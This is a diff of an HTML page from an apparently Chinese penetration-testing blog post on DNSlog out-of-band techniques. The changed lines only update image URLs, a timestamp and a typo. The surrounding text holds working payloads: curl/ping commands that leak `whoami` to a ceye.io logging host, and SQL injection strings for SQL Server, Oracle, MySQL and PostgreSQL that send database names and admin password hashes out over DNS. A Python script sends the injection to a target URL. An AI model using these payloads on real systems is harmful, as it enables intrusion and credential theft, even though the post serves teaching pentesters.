@@ -120,15 +120,15 @@
 <meta property="og:site_name" content="瓦都剋">
 <meta property="og:description" content="在渗透环境时，我们经常会遇到疑似命令执行还有些bool注入和延时注入，但是都没有回显。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/dnslog1.png">
-<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/dnslog2.png">
-<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/dnslog4.png">
-<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/dnslog5.png">
-<meta property="og:updated_time" content="2017-07-28T11:28:38.000Z">
+<meta property="og:image" content="http://blog.w2n1ck.com/dnslog1.png">
+<meta property="og:image" content="http://blog.w2n1ck.com/dnslog2.png">
+<meta property="og:image" content="http://blog.w2n1ck.com/dnslog4.png">
+<meta property="og:image" content="http://blog.w2n1ck.com/dnslog5.png">
+<meta property="og:updated_time" content="2018-12-14T06:04:37.012Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="渗透测试小技巧之DNSlog">
 <meta name="twitter:description" content="在渗透环境时，我们经常会遇到疑似命令执行还有些bool注入和延时注入，但是都没有回显。">
-<meta name="twitter:image" content="http://oa8y5guqs.bkt.clouddn.com/dnslog1.png">
+<meta name="twitter:image" content="http://blog.w2n1ck.com/dnslog1.png">
 
 
 
@@ -476,15 +476,15 @@
 <p>这样的多级域名方式，把我们需要返回的信息链接到url中，然后分析日志，test部分就是我们得到的信息。</p>
 <h2 id="0x01-1-命令执行"><a href="#0x01-1-命令执行" class="headerlink" title="0x01.1 命令执行"></a>0x01.1 命令执行</h2><p>在我们找到命令执行漏洞的时候，我们可以执行这样的命令判断</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">linux:</div><div class="line">curl http://ip.port.domain.ceye.io/`whoami`</div><div class="line">ping `whoami`.ip.port.domain.ceye.io</div><div class="line">windows:</div><div class="line">ping %USERNAME%.domain.ceye.io</div></pre></td></tr></table></figure>
-<p>这时候就可以去dnslog瓶体查看到信息</p>
-<p><img src="http://oa8y5guqs.bkt.clouddn.com/dnslog1.png" alt=""></p>
-<p><img src="http://oa8y5guqs.bkt.clouddn.com/dnslog2.png" alt=""></p>
+<p>这时候就可以去dnslog平台查看到信息</p>
+<p><img src="http://blog.w2n1ck.com/dnslog1.png" alt=""></p>
+<p><img src="http://blog.w2n1ck.com/dnslog2.png" alt=""></p>
 <h2 id="0x01-2-SQL注入"><a href="#0x01-2-SQL注入" class="headerlink" title="0x01.2 SQL注入"></a>0x01.2 SQL注入</h2><p><strong>SQL Server</strong><br>存储程序master..xp_dirtree（）用于获取所有文件夹的列表和给定文件夹内部的子文件夹。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">DECLARE @host varchar(1024);</div><div class="line">注册一个名为@host的变量，类型为varchar。</div><div class="line">SELECT @host=CONVERT(varchar(1024),db_name())+&apos;.xxxxxxxxx.ceye.io&apos;;</div><div class="line">获取db_name()然后转换成varchar类型，然后吧获取的db_name()返回值拼接到dnslog平台给我们的子域名里面，然后赋值给@host变量。</div><div class="line">EXEC(&apos;master..xp_dirtree &quot;\\&apos;+@host+&apos;\foobar$&quot;&apos;);</div><div class="line">列远程主机的foobar$目录,由于是远程主机，所以会做一个dns解析，这样我们的dns平台就能得到日志了</div><div class="line"></div><div class="line">http://xxxx.com.cn/?Id=123&apos;;DECLARE @host varchar(1024);SELECT @host=CONVERT(varchar(1024),db_name())+&apos;.xxxxxxxxx.ceye.io&apos;;EXEC(&apos;master..xp_dirtree &quot;\\&apos;+@host+&apos;\foobar$&quot;&apos;);--</div></pre></td></tr></table></figure></p>
 <p><strong>Oracle</strong><br>UTL_INADDR包用于互联网的寻址–诸如检索本地和远程主机的主机名和IP的地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">SELECT UTL_INADDR.GET_HOST_ADDRESS(&apos;ip.port.b182oj.ceye.io&apos;);</div><div class="line">SELECT UTL_HTTP.REQUEST(&apos;http://ip.port.b182oj.ceye.io/oracle&apos;) FROM DUAL;</div><div class="line">SELECT HTTPURITYPE(&apos;http://ip.port.b182oj.ceye.io/oracle&apos;).GETCLOB() FROM DUAL;</div><div class="line">SELECT DBMS_LDAP.INIT((&apos;oracle.ip.port.b182oj.ceye.io&apos;,80) FROM DUAL;</div><div class="line">SELECT DBMS_LDAP.INIT((SELECT password FROM SYS.USER$ WHERE name=&apos;SYS&apos;)||&apos;.ip.port.b182oj.ceye.io&apos;,80) FROM DUAL;</div></pre></td></tr></table></figure></p>
 <p><strong>MySQL</strong><br>MySQL的函数LOAD_FILE()读取文件内容并将其作为字符串返回：LOAD_FILE()<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT LOAD_FILE(CONCAT(&apos;\\\\&apos;,(SELECT password FROM user WHERE user=&apos;root&apos; LIMIT 1),&apos;.b182oj.ceye.io\\abc&apos;));</div></pre></td></tr></table></figure></p>
 <p><strong>PostgreSQL</strong><br>PostgreSQL的声明COPY用于在文件系统的文件和表之间拷贝数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">DROP TABLE IF EXISTS table_output;</div><div class="line">CREATE TABLE table_output(content text);</div><div class="line">CREATE OR REPLACE FUNCTION temp_function()</div><div class="line">RETURNS VOID AS $$</div><div class="line">DECLARE exec_cmd TEXT;</div><div class="line">DECLARE query_result TEXT;</div><div class="line">BEGIN</div><div class="line">SELECT INTO query_result (SELECT passwd</div><div class="line">FROM pg_shadow WHERE usename=&apos;postgres&apos;);</div><div class="line">exec_cmd := E&apos;COPY table_output(content)</div><div class="line">FROM E\&apos;\\\\\\\\&apos;||query_result||E&apos;.psql.ip.port.b182oj.ceye.io\\\\foobar.txt\&apos;&apos;;</div><div class="line">EXECUTE exec_cmd;</div><div class="line">END;</div><div class="line">$$ LANGUAGE plpgsql SECURITY DEFINER;</div><div class="line">SELECT temp_function();</div></pre></td></tr></table></figure></p>
-<p><img src="http://oa8y5guqs.bkt.clouddn.com/dnslog4.png" alt=""></p>
-<p><img src="http://oa8y5guqs.bkt.clouddn.com/dnslog5.png" alt=""></p>
+<p><img src="http://blog.w2n1ck.com/dnslog4.png" alt=""></p>
+<p><img src="http://blog.w2n1ck.com/dnslog5.png" alt=""></p>
 <p>写个脚本：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">import urllib2</div><div class="line"></div><div class="line">for i in range(50):</div><div class="line">    if i==0:</div><div class="line">        continue</div><div class="line">    url = &apos;&apos;&apos;http://xxxx.com.cn/?Id=123&apos;;DECLARE @host varchar(1024);SELECT @host=CONVERT(varchar(1024),db_name())+&apos;.xxxxxxxxx.ceye.io&apos;;EXEC(&apos;master..xp_dirtree &quot;\\&apos;+@host+&apos;\foobar$&quot;&apos;);--&apos;&apos;&apos;</div><div class="line">    url = url.replace(&quot;dbid=1&quot;,&quot;dbid=&quot;+str(i))</div><div class="line">    req = urllib2.Request(url)</div><div class="line">    print req.get_full_url()</div><div class="line">    print urllib2.urlopen(req).read()</div></pre></td></tr></table></figure>
       
